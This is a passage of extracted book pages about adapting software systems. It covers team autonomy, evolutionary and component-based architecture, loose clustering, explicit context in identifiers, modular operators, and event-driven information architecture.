      "content": "Process and Organization • 297\n\nCaller\n\nRequestDetails\n\nPromotions\n\nShared Database\n\nPage Oﬀers\n\nUser OﬀersUser IDPage ID\n\nInstead of building a single “promotions service” as before, you could build two services that can each chime in when a new user hits your front end. In the next figure, each service makes a decision based on whatever user infor- mation is available.\n\nCaller\n\nUser ID\n\nUser-Based Promotions\n\nUser OﬀersPage IDpromotion\n\nPage-BasedPromotions\n\nEach promotion service handles just one dimension. The user offers still need a database, but maybe the page-based offers just require a table of page types embedded in the code. After all, if you can deploy code changes in a matter of minutes, do you really need to invest in content management? Just call your source code repo the content management repository.\n\nIt’s important to note that this doesn’t eliminate complexity. Some irreducible —even essential—complexity remains. It does portion the complexity into different codebases, though. Each one should be easier to maintain and prune, just as it’s easier to prune a bonsai juniper than a hundred-foot oak. Here, instead of making a single call, the consumer has to decide which of the ser- vices to call. It may need to issue calls in parallel and decide which response to use (if any arrive at all). One can further subdivide the complexity by adding an application-aware router between the caller and the offer services.\n\nreport erratum • discuss",
      "content_length": 1473,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 302,
      "content": "Chapter 16. Adaptation • 298\n\nOne service will probably outperform the other. (Though you need to define “outperform.” Is it based just on the conversion rate? Or is it based on cus- tomer acquisition cost versus lifetime profitability estimates?) What should you do with the laggard? There are only five choices you can make:\n\n1. Keep running both services, with all their attendant development and\n\noperational expenses.\n\n2. Take away funding from the successful one and use that money to make\n\nthe unsuccessful one better.\n\n3. Retool the unsuccessful one to work in a different area where it isn’t head- to-head competing with the better one. Perhaps target a different user segment or a different part of the customer life cycle.\n\n4. Delete the unsuccessful one. Aim the developers at someplace where they\n\ncan do something more valuable.\n\n5. Give up, shut down the whole company, and open a hot dog and doughnut\n\nshop in Fiji.\n\nThe typical corporate approach would be #1 or #2. Starve the successful projects because they’re “done” and double down on the efforts that are behind schedule or over budget. Not to mention that in a typical corporation, shutting down a system or service carries a kind of moral stigma. Choice #3 is a better approach. It preserves some value. It’s a pivot.\n\nYou need to give serious consideration to #4, though. The most important part of evolution is extinction. Shut off the service, delete the code, and reassign the team. That frees up capacity to work on higher value efforts. It reduces dependencies, which is vital to the long-term health of your organi- zation. Kill services in small grains to preserve the larger entity.\n\nAs for Fiji, it’s a beautiful island with friendly people. Bring sunscreen and grow mangoes.\n\nTeam-Scale Autonomy\n\nYou’re probably familiar with the concept of the two-pizza team. This is Amazon founder and CEO Jeff Bezos’s rule that every team should be sized no bigger than you can feed with two large pizzas. It’s an important but mis- understood concept. It’s not just about having fewer people on a team. That does have its own benefit for communication.\n\nA self-sufficient two-pizza team also means each team member has to cover more than one discipline. You can’t have a two-pizza team if you need a dedicated\n\nreport erratum • discuss",
      "content_length": 2309,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 303,
      "content": "Process and Organization • 299\n\nDBA, a front-end developer, an infrastructure guru, a back-end developer, a machine-learning expert, a product manager, a GUI designer, and so on.\n\nThe two-pizza team is about reducing external dependencies. Every dependen- cy is like one of the Lilliputian’s ropes tying Gulliver to the beach. Each dependency thread may be simple to deal with on its own, but a thousand of them will keep you from breaking free.\n\nNo Coordinated Deployments\n\nThe price of autonomy is eternal vigilance...or something like that. If you ever find that you need to update both the provider and caller of an service interface at the same time, it’s a warning sign that those services are strongly coupled.\n\nIf you are the service provider, you are responsible. You can probably rework the interface to be backward-compatible. (See Nonbreaking API Changes, on page 263, for strategies to avoid breakage.) If not, consider treating the new interface as a new route in your API. Leave the old one in place for now. You can remove it in a few days or weeks, after your consumers have updated.\n\nDependencies across teams also create timing and queuing problems. Anytime you have to wait for others to do their work before you can do your work, everyone gets slowed down. If you need a DBA from the enterprise data architecture team to make a schema change before you can write the code, it means you have to wait until that DBA is done with other tasks and is available to work on yours. How high you are on the priority list determines when the DBA will get to your task.\n\nThe same goes for downstream review and approval processes. Architecture review boards, release management reviews, change control committees, and the People’s Committee for Proper Naming Conventions...each review process adds more and more time.\n\nThis is why the concept of the two-pizza team is misunderstood. It’s not just about having a handful of coders on a project. It’s really about having a small group that can be self-sufficient and push things all the way through to production.\n\nGetting down to this team size requires a lot of tooling and infrastructure support. Specialized hardware like firewalls, load balancers, and SANs must have APIs wrapped around them so each team can manage its own configu- ration without wreaking havoc on everyone else. The platform team I discussed in Platform Team, on page 292, has a big part to play in all this. The platform team’s objective must be to enable and facilitate this team-scale autonomy.\n\nreport erratum • discuss",
      "content_length": 2555,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 304,
      "content": "Chapter 16. Adaptation • 300\n\nBeware Efficiency\n\n“Efficiency” sounds like it could only ever be a good thing, right? Just trying telling your CEO that the company is too efficient and needs to introduce some inefficiency! But efficiency can go wrong in two crucial ways that hurt your adaptability.\n\nEfficiency sometimes translates to “fully utilized.” In other words, your com- pany is “efficient” if every developer develops and every designer designs close to 100 percent of the time. This looks good when you watch the people. But if you watch how the work moves through the system, you’ll see that this is anything but efficient. We’ve seen this lesson time and time again from The Goal [Gol04], to Lean Software Development [PP03], to Principles of Product Development Flow [Rei09], to Lean Enterprise [HMO14] and The DevOps Handbook [KDWH16]: Keep the people busy all the time and your overall pace slows to a crawl.\n\nA more enlightened view of efficiency looks at the process from the point of view of the work instead of the workers. An efficient value stream has a short cycle time and high throughput. This kind of efficiency is better for the bottom line than high utilization. But there’s a subtle trap here: as you make a value stream more efficient, you also make it more specialized to today’s tasks. That can make it harder to change for the future.\n\nWe can learn from a car manufacturer that improved its cycle time on the production line by building a rig that holds the car from the inside. The new rig turned, lifted, and positioned the car as it moved along the production line, completely replacing the old conveyor belt. It meant that the worker (or robot) could work faster because the work was always positioned right in front of them. Workers didn’t need to climb into the trunk to place a bolt from the inside. It reduced cycle time and had a side effect of reducing the space needed for assembly. All good, right? The bad news was that they then needed a custom rig for each specific type of vehicle. Each model required its own rig, and so it became more difficult to redesign the vehicle, or switch from cars to vans or trucks. Efficiency came at the cost of flexibility.\n\nThis is a fairly general phenomenon: a two-person sailboat is slow and labor- intensive, but you can stop at any sand bar that strikes your fancy. A contain- er ship carries a lot more stuff, but it can only dock at deep water terminals. The container ship trades efficiency for flexibility.\n\nDoes this happen in the software industry? Absolutely. Ask anyone who relies on running builds with Visual Studio out of Team Foundation Server how easily they can move to Jenkins and Git. For that matter, just try to port your\n\nreport erratum • discuss",
      "content_length": 2750,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 305,
      "content": "System Architecture • 301\n\nbuild pipeline from one company to another. All the hidden connections that make it efficient also make it harder to adapt.\n\nKeep these pitfalls in mind any time you build automation and tie into your infrastructure or platform. Shell scripts are crude, but they work everywhere. (Even on that Windows server, now that the “Windows Subsystem for Linux” is out of beta!) Bash scripts are that two-person sailboat. You can go anywhere, just not very quickly. A fully automated build pipeline that delivers containers straight into Kubernetes every time you make a commit and that shows commit tags on the monitoring dashboard will let you move a lot faster, but at the cost of making some serious commitments.\n\nBefore you make big commitments, use the grapevine in your company to find out what might be coming down the road. For example, in 2017 many companies are starting to feel uneasy about their level of dependency on Amazon Web Services. They are edging toward multiple clouds or just straight- out migrating to a different vendor. If your company is one of them, you’d really like to know about it before you bolt your new platform onto AWS.\n\nSummary\n\nAdaptability doesn’t happen by accident. If there’s a natural order to software, it’s the Big Ball of Mud.4 Without close attention, dependencies proliferate and coupling draws disparate systems into one brittle whole.\n\nLet’s now turn from the human side of adaptation to the structure of the software itself.\n\nSystem Architecture\n\nIn The Evolution of Useful Things [Pet92], Henry Petroski argues that the old dictum “Form follows function” is false. In its place, he offers the rule of design evolution, “Form follows failure.” That is, changes in the design of such commonplace things as forks and paper clips are motivated more by the things early designs do poorly than those things they do well. Not even the humble paper clip sprang into existence in its present form. Each new attempt differs from its predecessor mainly in its attempts to correct flaws.\n\nThe fledgling system must do some things right, or it would not have been launched, and it might do other things as well as the designers could conceive. Other features might work as built but not as intended, or they might be more difficult than they should be. In essence, there are gaps and protrusions\n\n4.\n\nhttp://www.laputan.org/mud\n\nreport erratum • discuss",
      "content_length": 2412,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 306,
      "content": "Chapter 16. Adaptation • 302\n\nbetween the shape of the system and the solution space it’s meant to occupy. In this section, we’ll look at how the system’s architecture can make it easier to adapt over time.\n\nEvolutionary Architecture\n\nIn Building Evolutionary Architectures [FPK17], Neal Ford, Rebecca Parsons, and Patrick Kua define an evolutionary architecture as one that “supports incremental, guided change as a first principle across multiple dimensions.” Given that definition, you might reasonably ask why anyone would build a nonevolutionary architecture!\n\nSadly, it turns out that many of the most basic architecture styles inhibit that incremental, guided change. For example, the typical enterprise applica- tion uses a layered architecture something like the one shown in the following illustration. The layers are traditionally separated to allow technology to change on either side of the boundary. How often do we really swap out the database while holding everything else constant? Very seldom. Layers enforce vertical isolation, but they encourage horizontal coupling.\n\nUser interface\n\nSession\n\nDomain\n\nPersistence\n\nThe horizontal coupling is much more likely to be a hindrance. You’ve probably encountered a system with three or four gigantic domain classes that rule the world. Nothing can change without touching one of those, but any time you change one, you have to contain ripples through the codebase—not to mention retesting the world.\n\nWhat happens if we rotate the barriers 90 degrees? We get something like component-based architecture. Instead of worrying about how to isolate the domain layer from the database, we isolate components from each other. Components are only allowed narrow, formal interfaces between each other. If you squint, they look like microservice instances that happen to run in the same process.\n\nreport erratum • discuss",
      "content_length": 1874,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 307,
      "content": "System Architecture • 303\n\nBad Layering\n\nTrouble arises when layers are built: any common change requires a drilling expedition to pierce through several of them. Have you ever checked in a commit that had a bunch of new files like “Foo,” “FooController,” “FooFragment,” “FooMapper,” “FooDTO,” and so on? That is evidence of bad layering.\n\nIt happens when one layer’s way of breaking down the problem space dominates the other layers. Here, the domain dominates, so when a new concept enters the domain, it has shadows and reflections in the other layers.\n\nLayers could change independently if each layer expressed the fundamental concepts of that layer. “Foo” is not a persistence concept, but “Table” and “Row” are. “Form” is a GUI concept, as is “Table” (but a different kind of table than the persistence one!) The boundary between each layer should be a matter of translating concepts.\n\nIn the UI, a domain object should be atomized into its constituent attributes and constraints. In persistence, it should be atomized into rows in one or more tables (for a relational DB) or one or more linked documents.\n\nWhat appears as a class in one layer should be mere data to every other layer.\n\nEach component owns its whole stack, from database up through user interface or API. That does mean the eventual human interface needs a way to federate the UI from different components. But that’s no problem at all! Components may present HTML pages with hyperlinks to themselves or other components. Or the UI may be served by a front-end app that makes API calls to a gateway or aggregator. Make a few of these component-oriented stacks and you’ll arrive at a structure called “self-contained systems.”5\n\nThis is one example of moving toward an evolutionary architecture. In the example we’ve just worked through, it allows incremental guided change along the dimensions of “business requirements” and “interface technology.” You should get comfortable with some of the other architecture styles that lend themselves to evolutionary architecture:\n\nMicroservices\n\nVery small, disposable units of code. Emphasize scalability, team-scale autonomy. Vulnerable to coupling with platform for monitoring, tracing, and continuous delivery.\n\nMicrokernel and plugins\n\nIn-process, in-memory message passing core with formal interfaces to extensions. Good for incremental change in require- ments, combining work from different teams. Vulnerable to language and runtime environment.\n\n5.\n\nhttp://scs-architecture.org\n\nreport erratum • discuss",
      "content_length": 2525,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 308,
      "content": "Chapter 16. Adaptation • 304\n\nEvent-based\n\nPrefers asynchronous messages for communication, avoiding direct calls. Good for temporal decoupling. Allows new subscribers without change to publishers. Allows logic change and reconstruction from history. Vulnerable to semantic change in message formats over time.\n\nIt may be clear from those descriptions, but every architecture style we’ve dis- covered so far has trade-offs. They’ll be good in certain dimensions and weak in others. Until we discover the Ur-architecture that evolves in every dimension, we’ll have to decide which ones matter most for our organizations. A startup in the hypergrowth stage probably values scaling the tech team much more than it values long-term evolution of the business requirements. An established enterprise that needs to depreciate its capital expenditure over five years needs to evolve along business requirements and also the technology platform.\n\nA Note on Microservices\n\nMicroservices are a technological solution to an organizational problem. As an orga- nization grows, the number of communication pathways grows exponentially. Simi- larly, as a piece of software grows, the number of possible dependencies within the software grows exponentially.\n\nClasses tend toward a power-law distribution. Most classes have one or a few dependencies, while a very small number have hundreds or thousands. That means any particular change is likely to encounter one of those and incur a large risk of “action at a distance.” This makes developers hesitant to touch the problem classes, so necessary refactoring pressure is ignored and the problem gets worse. Eventually, the software degrades to a Big Ball of Mud.\n\nThe need for extensive testing grows with the software and the team size. Unforeseen consequences multiply. Developers need a longer ramp-up period before they can work safely in the codebase. (At some point, that ramp-up time exceeds your average developer tenure!)\n\nMicroservices promise to break the paralysis by curtailing the size of any piece of software. Ideally it should be no bigger than what fits in one developer’s head. I don’t mean that metaphorically. When shown on screen, the length of the code should be smaller than the coder’s melon. That forces you to either write very small services or hire a very oddly proportioned development staff.\n\nAnother subtle issue about microservices that gets lost in the excitement is that they’re great when you are scaling up your organization. But what happens when you need to downsize? Services can get orphaned easily. Even if they get adopted into a good home, it’s easy to get overloaded when you have twice as many services as developers.\n\nDon’t pursue microservices just because the Silicon Valley unicorns are doing it. Make sure they address a real problem you’re likely to suffer. Otherwise, the opera- tional overhead and debugging difficulty of microservices will outweigh your benefits.\n\nreport erratum • discuss",
      "content_length": 2978,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 309,
      "content": "System Architecture • 305\n\nLoose Clustering\n\nSystems should exhibit loose clustering. In a loose cluster, the loss of an indi- vidual instance is no more significant than the fall of a single tree in a forest.\n\nHowever, this implies that individual servers don’t have differentiated roles. At the very least any differentiated roles are present in more than one instance. Ideally, the service wouldn’t have any unique instance. But if it does need a unique role, then it should use some form of leader election. That way the service as a whole can survive the loss of the leader without manual interven- tion to reconfigure the cluster.\n\nThe members of a loose cluster can be brought up or down independently of each other. You shouldn’t have to start the members in a specific sequence. In addition, the instances in a cluster shouldn’t have any specific dependencies on—or even knowledge of—the individual instances of another cluster. They should only depend on a virtual IP address or DNS name that represents the service as a whole. Direct member-to-member dependencies create hard linkages preventing either side from changing independently. Take a look at the following figure for an example. The calling application instances in cluster 1 depend on the DNS name (bound to a load-balanced IP address) cluster 2 serves.\n\nCluster 1\n\nApp Instances\n\nCluster 2\n\nApp Instances\n\nport\n\nWe can extend this “principle of ignorance” further. The members of a cluster should not be configured to know the identities of other members of the cluster. That would make it harder to add or remove members. It can also encourage point-to-point communication, which is a capacity killer.\n\nThe nuance behind this rule is that cluster members can discover who their colleagues are. That’s needed for distributed algorithms like leader election and failure detection. The key is that this is a runtime mechanism that doesn’t require static configuration. In other words, one instance can observe others appearing and disappearing in response to failures or scaling.\n\nLoose clustering in this way allows each cluster to scale independently. It allows instances to appear, fail, recover, and disappear as the platform allows and as traffic demands.\n\nreport erratum • discuss",
      "content_length": 2257,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 310,
      "content": "Chapter 16. Adaptation • 306\n\nExplicit Context\n\nSuppose your service receives this fragment of JSON inside a request:\n\n{\"item\": \"029292934\"}\n\nHow much do we know about the item? Is that string the item itself? Or is it an item identifier? Maybe the field would be better named “itemID.” Supposing that it is an identifier, our service can’t do very much with it. In fact, only four things are possible:\n\n1. Pass it through as a token to other services. (This includes returning it\n\nto the same caller in the future.)\n\n2. Look it up by calling another service.\n\n3. Look it up in our own database.\n\n4. Discard it.\n\nIn the first case, we’re just using the “itemID” as a token. We don’t care about the internal structure. In this case it would be a mistake to convert it from string to numeric. We’d be imposing a restriction that doesn’t add any value and will probably need to be changed—with huge disruption—in the future.\n\nIn the second and third cases, we’re using the “itemID” as something we can resolve to get more information. But there’s a serious problem here. The bare string shown earlier doesn’t tell us who has the authoritative information. If the answer isn’t in our own database, we need to call another service. Which service?\n\nThis issue is so pervasive that it doesn’t even look like a problem at first. In order to get item information, your service must already know who to call! That’s an implicit dependency.\n\nThat implicit dependency limits you to working with just the one service provider. If you need to support items from two different “universes,” it’s going to be very disruptive.\n\nSuppose instead the initial fragment of JSON looked like this:\n\n{\"itemID\": \"https://example.com/policies/029292934\"}\n\nThis URL still works if we just want to use it as an opaque token to pass for- ward. From one perspective, it’s still just a Unicode string.\n\nThis URL also still works if we need to resolve it to get more information. But now our service doesn’t have to bake in knowledge of the solitary authority. We can support more than one of them.\n\nreport erratum • discuss",
      "content_length": 2090,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 311,
      "content": "System Architecture • 307\n\nBy the way, using a full URL also makes integration testing easier. We no longer need “test” versions of the other services. We can supply our own test harnesses and use URLs to those instead of the production authorities.\n\nThis example is all in the context of interservice communication. But making implicit context into explicit context has big benefits inside services as well. If you’ve worked on a Ruby on Rails system, you might have run into difficulty when trying to use multiple relational databases from a single service. That’s because ActiveRecord uses an implicit database connection. This is convenient when there’s just one database, but it becomes a hindrance when you need more than one.\n\nGlobal state is the most insidious form of implicit context. That include con- figuration parameters. These will slow you down when you need to go from “one” to “more than one” of a collaboration.\n\nCreate Options\n\nImagine you are an architect—the kind that makes buildings. Now you’ve been asked to add a new wing to the iconic Sydney Opera House. Where could you possibly expand that building without ruining it? The Australian landmark is finished. It is complete—a full expression of its vision. There is no place to extend it.\n\nTake the same request, but now for the Winchester “Mystery” House in San Jose, California.6 Here’s its description in Wikipedia:\n\nSince its construction in 1884, the property and mansion were claimed by many, including Winchester herself, to be haunted by the ghosts of those killed with Winchester rifles. Under Winchester’s day-to-day guidance, its “from-the-ground- up” construction proceeded around the clock, by some accounts, without inter- ruption, until her death on September 5, 1922.7\n\nCould you add a wing to this house without destroying the clarity of its vision? Absolutely. In some sense, continuous change is the vision of the house, or it was to its late owner. The Winchester house is not coherent in the way that the Opera House is. Stairways lead to ceilings. Windows look into rooms next door. You might call this “architecture debt.” But you have to admit it allows for change.\n\nThe reason these differ is mechanical as much as it is artistic. A flat exterior wall on the Winchester house has the potential for a door. The smoothly curved\n\n6. 7.\n\nhttp://www.winchestermysteryhouse.com\n\nhttps://en.wikipedia.org/wiki/Winchester_Mystery_House\n\nreport erratum • discuss",
      "content_length": 2454,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 312,
      "content": "Chapter 16. Adaptation • 308\n\nsurfaces of Sydney’s shells don’t. A flat wall creates an option. A future owner can exercise that option to add a room, a hallway, or a stair to nowhere.\n\nModular systems inherently have more options than monolithic ones. Think about building a PC from parts. The graphics card is a module that you can substitute or replace. It gives you an option to apply a modification.\n\nIn Design Rules [BC00], Carliss Y. Baldwin and Kim B. Clark identify six “modular operators.” Their work was in the context of computer hardware, but it applies to distributed service-based systems as well. Every module boundary gives you an option to apply these operators in the future. Let’s take a brief look at the operators and how they could apply in a software system.\n\nSplitting\n\nSplitting breaks a design into modules, or a module into submodules. The following figure shows a system before and after splitting “Module 1” into three parts. This is often done to distribute work. Splitting requires insight into how the features can be decomposed so that cross-dependencies in the new modules are minimized and the extra work of splitting is offset by the increased value of more general modules.\n\nBefore\n\nSystem\n\nModule 1\n\nModule 2\n\n1-a\n\n1-c\n\nSystem\n\n1-b\n\nModule 2\n\nModule 3\n\nModule 4\n\nAfter\n\nModule 4\n\nModule 3\n\nShell Delegates Work\n\nreport erratum • discuss",
      "content_length": 1375,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 313,
      "content": "System Architecture • 309\n\nExample: We start with a module that determines how to ship products to a customer. It uses the shipping address to decide how many shipments to send, how much it’ll cost, and when the shipments will arrive.\n\nOne way to split the module is shown in the next figure. Here, the parent module will invoke the submodules sequentially, using the results from one to pass into the next.\n\nStore\n\nShippingService\n\nBefore\n\nSystem\n\nShippingFacade\n\nAfter\n\nShipments\n\nShippingCost\n\nDeliveryEstimates\n\nA different way to split the modules might be one per carrier. In that case, the parent could invoke them all in parallel and then decide whether to present the best result or all results to the user. This makes the modules act a bit more like competitors. It also breaks down the sequential dependency from the functional division illustrated in the previous figure. But where this divi- sion really shines is failure isolation. In the original decomposition, if just one of the modules is broken, then the whole feature doesn’t work. If we divide the work by carrier, as illustrated in the figure on page 310, then one carrier’s service may be down or malfunctioning but the others will continue to work. Overall, we can still ship things through the other carriers. Of course, this assumes the parent module makes calls in parallel and times out properly when a module is unresponsive.\n\nThe key with splitting is that the interface to the original module is unchanged. Before splitting, it handles the whole thing itself. Afterward, it delegates work to the new modules but supports the same interface.\n\nreport erratum • discuss",
      "content_length": 1647,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 314,
      "content": "Chapter 16. Adaptation • 310\n\nCarrier 1\n\nStore\n\nShippingService\n\nBefore\n\nSystem\n\nShippingFacade\n\nAfter\n\nCarrier 2\n\nCarrier 3\n\nA great paper on splitting is David Parnas’s 1971 paper, “On the Criteria to Be Used in Decomposing Systems.”8\n\nSubstituting\n\nGiven a modular design, “substituting” is just replacing one module with another—swapping out an NVidia card for an AMD card or vice versa.\n\nThe original module and the substitute need to share a common interface. That’s not to say they have identical interfaces, just that the portion of the interface needed by the parent system must be the same. Subtle bugs often creep in with substitutions.\n\nIn our running example, we might substitute a logistics module from UPS or FedEx in place of our original home-grown calculator.\n\nAugmenting and Excluding\n\nAugmenting is adding a module to a system. Excluding is removing one. Both of these are such common occurrences that we might not even think of them as design-changing operations. However, if you design your parent system to make augmenting and excluding into first-class priorities, then you’ll reach a different design.\n\n8.\n\nhttp://repository.cmu.edu/cgi/viewcontent.cgi?article=2979&context=compsci\n\nreport erratum • discuss",
      "content_length": 1232,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 315,
      "content": "System Architecture • 311\n\nFor example, if you decompose your system along technical lines you might end up with a module that writes to the database, a module that renders HTML, a module that supports an API, and a module that glues them all together. How many of those modules could you exclude? Possibly the API or the HTML, but likely not both. The storage interface might be a candidate for substitution, but not exclusion!\n\nSuppose instead you have a module that recommends related products. The module offers an API and manages its own data. You have another module that displays customer ratings, another that returns the current price, and one that returns the manufacturer’s price. Now each of these could be excluded individually without major disruption.\n\nThe second decomposition offers more options. You have more places to exclude or augment.\n\nInversion\n\nInversion works by taking functionality that’s distributed in several modules and raising it up higher in the system. It takes a good solution to a general problem, extracts it, and makes it into a first-class concern.\n\nIn the following figure, several services have their own way of performing A/B tests. This is a feature that each service built...and probably not in a consistent way. This would be a candidate for inversion. In the figure on page 312, you can see that the “experimentation” service is now lifted up to the top level of the system. Individual services don’t need to decide whether to put a user in the control group or the test group. They just need to read a header attached to the request.\n\nApp\n\nAPI\n\nRegister\n\nFeaturedContent\n\nProjectSearch\n\nProposal\n\nA/BtestA/BtestA/Btest\n\nInversion can be powerful. It creates a new dimension for variation and can reveal a business opportunity...like the entire market for operating systems.\n\nreport erratum • discuss",
      "content_length": 1847,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 316,
      "content": "Chapter 16. Adaptation • 312\n\nAPI\n\nRegister\n\nFeaturedContent\n\nProjectSearch\n\nProposal\n\nExperimentation\n\nApp\n\nPorting\n\nBaldwin and Clark look at porting in terms of moving hardware or operating system modules from one CPU to another. We can take a more general view. Porting is really about repurposing a module from a different system. Any time we use a service created by a different project or system, we’re “porting” that service to our system, as shown in the following figure.\n\nModule 1\n\nModule 2\n\nModule 3\n\nModule X\n\nSystem 2\n\nModule Y\n\n“ported”module\n\nSystem 1\n\nPorting risks adding coupling, though. It clearly means a new dependency, and if the road map of that service diverges from our needs, then we must make a substitution. In the meantime, though, we may still benefit from using it.\n\nThis is kind of analogous to porting C sources from one operating system to another. The calling sequences may look the same but have subtle differences that cause errors. The new consumer must be careful to exercise the module thoroughly via the same interface that will be used in production. That doesn’t mean the new caller has to replicate all the unit and integration tests that the module itself runs. It’s more that the caller should make sure its own calls work as expected.\n\nAnother way of “porting” a module into our system is through instantiation. We don’t talk about this option very often, but nothing says that a service’s code can only run in a single cluster. If we need to fork the code and deploy a new instance, that’s also a way to bring the service into our system.\n\nreport erratum • discuss",
      "content_length": 1614,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 317,
      "content": "Information Architecture • 313\n\nBaldwin and Clark argue that these six operators can create any arbitrarily complex structure of modules. They also show that the economic value of the system increases with the number of options—or boundaries—where you can apply these operators.\n\nKeep these operators in your pocket as thinking tools as well. When you look at a set of features, think of three different ways to split them into modules. Think of how you can make modules that allow exclusion or augmentation. See where an inversion might be lurking.\n\nSummary\n\nWe’ve looked at a few ways to build your architecture to make it adaptable:\n\nLoose clusters are a great start.\n\nUse an evolutionary architecture with microservices, messages, microker-\n\nnels, or something that doesn’t start with m.\n\nAsynchrony helps here, just as it helps combat the stability antipatterns.\n\nBe explicit about context so that services can work with many participants\n\ninstead of having an implied connection to just one.\n\nCreate options for the future. Make room to apply the modular operations.\n\nThere’s one last source of inflexibility we need to address. That’s in the way we structure, pass, and refer to data.\n\nInformation Architecture\n\nInformation architecture is how we structure data. It’s the data and metadata we use to describe the things that matter to our systems. We also need to keep in mind that it’s not reality, or even a picture of reality. It’s a set of related models that capture some facets of reality. Our job is to chose which facets to model, what to leave out, and how concrete to be.\n\nWhen you’re embedded in a paradigm, it’s hard to see its limits. Many of us got started in the era of relational databases and object-oriented programming, so we tend to view the world in terms of related objects and their states. Relational databases are good at answering, “What is the value of attribute A on entity E right now?” But they’re somewhat less good at keeping track of the history of attribute A on entity E. They’re pretty awkward with graphs or hierarchies, and they’re downright terrible at images, sound, or video.\n\nOther database models are good at other questions.\n\nreport erratum • discuss",
      "content_length": 2201,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 318,
      "content": "Chapter 16. Adaptation • 314\n\nTake the question, “Who wrote Hamlet?” In a relational model, that question has one answer: Shakespeare, William. Your schema might allow coauthors, but it surely wouldn’t allow for the theory that Kit Marlowe wrote Shake- speare’s plays. That’s because the tables in a relational database are meant to represent facts. On the other hand, statements in an RDF triple store are assertions rather than facts. Every statement there comes with an implicit, “Oh yeah, who says?” attached to it.\n\nAnother perspective: In most databases, the act of changing the database is a momentary operation that has no long-lived reality of its own. In a few, however, the event itself is primary. Events are preserved as a journal or log. The notion of the current state is really to say, “What’s the cumulative effect of everything that’s ever happened?”\n\nEach of these embeds a way of modeling the world. Each paradigm defines what you can and cannot express. None of them are the whole reality, but each of them can represent some knowledge about reality.\n\nYour job in building systems is to decide what facets of reality matter to your system, how you are going to represent those, and how that representation can survive over time. You also have to decide what concepts will remain local to an application or service, and what concepts can be shared between them. Sharing concepts increases expressive power, but it also creates coupling that can hinder change.\n\nIn this section, we’ll look at the most important aspects of information architecture as it affects adaptation. This is a small look at a large subject. For much more on the subject, see Foundations of Databases [AHV94] and Data and Reality [Ken98].\n\nMessages, Events, and Commands\n\nIn “What Do You Mean by ’Event-Driven’?”9 Martin Fowler points out the unfortunate overloading of the word “event.” He and his colleagues identified three main ways events are used, plus a fourth term that is often conflated with events:\n\nEvent notification: A fire-and-forget, one-way announcement. No response\n\nis expected or used.\n\nEvent-carried state transfer: An event that replicates entities or parts of\n\nentities so other systems can do their work\n\n9.\n\nhttps://martinfowler.com/articles/201701-event-driven.html\n\nreport erratum • discuss",
      "content_length": 2309,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 319,
      "content": "Information Architecture • 315\n\nEvent sourcing: When all changes are recorded as events that describe\n\nthe change\n\nCommand-query responsibility segregation (CQRS): Reading and writing with different structures. Not the same as events, but events are often found on the “command” side.\n\nEvent sourcing has gained support thanks to Apache Kafka,10 which is a persistent event bus. It blends the character of a message queue with that of a distributed log. Events stay in the log forever, or at least until you run out of space. With event sourcing, the events themselves become the authoritative record. But since it can be slow to walk through every event in history to figure out the value of attribute A on entity E, we often keep views to make it fast to answer that question. See the following figure for illustration.\n\nt=0\n\nnext event\n\nView A\n\nView B\n\nView C\n\nSnapshot\n\nread index\n\nWith an event journal, several views can each project things in a different way. None of them is more “true” than others. The event journal is the only truth. The others are caches, optimized to answer a particular kind of question. These views may even store their current state in a database of their own, as shown with the “snapshot” in the previous diagram.\n\nVersioning can be a real challenge with events, especially once you have years’ worth of them. Stay away from closed formats like serialized objects. Look toward open formats like JSON or self-describing messages. Avoid frameworks that require code generation based on a schema. Likewise avoid anything that requires you to write a class per message type or use annotation-based\n\n10. http://kafka.apache.org\n\nreport erratum • discuss",
      "content_length": 1682,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 320,
      "content": "Chapter 16. Adaptation • 316\n\nmapping. Treat the messages like data instead of objects and you’re going to have a better time supporting very old formats.\n\nYou’ll want to apply some of the versioning principles discussed in Chapter 14, Handling Versions, on page 263. In a sense, a message sender is commu- nicating with a future (possibly not-yet-written) interface. A message reader is receiving a call from the distant past. So data versioning is definitely a concern.\n\nUsing messages definitely brings complexity. People tend to express business requirements in an inherently synchronous way. It requires some creative thinking to transform them to be asynchronous.\n\nServices Control Their Identifiers\n\nSuppose you work for an online retailer and you need to build a “catalog” service. You’ll see in Embrace Plurality, on page 321, that one catalog will never be enough. A catalog service should really handle many catalogs. Given that, how should we identify which catalog goes with which user?\n\nThe first, most obvious approach is to assign an owner to each catalog, as shown in the following figure. When a user wants to access a particular cata- log, the owner ID is included in the request.\n\nCaller\n\nCatalogsService\n\nAdd (POST Owner ID and Item data)\n\nItem URL\n\nQuery (GET on search URL w/owner ID and query params)Results\n\nThis has two problems:\n\n1. The catalog service must couple to one particular authority for users. This means that the caller and the provider have to participate in the same authentication and authorization protocol. That protocol certainly stops at the edge of your organization, so it automatically makes it hard to work with partners. But it also increases the barrier to use of the new service.\n\nreport erratum • discuss",
      "content_length": 1757,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 321,
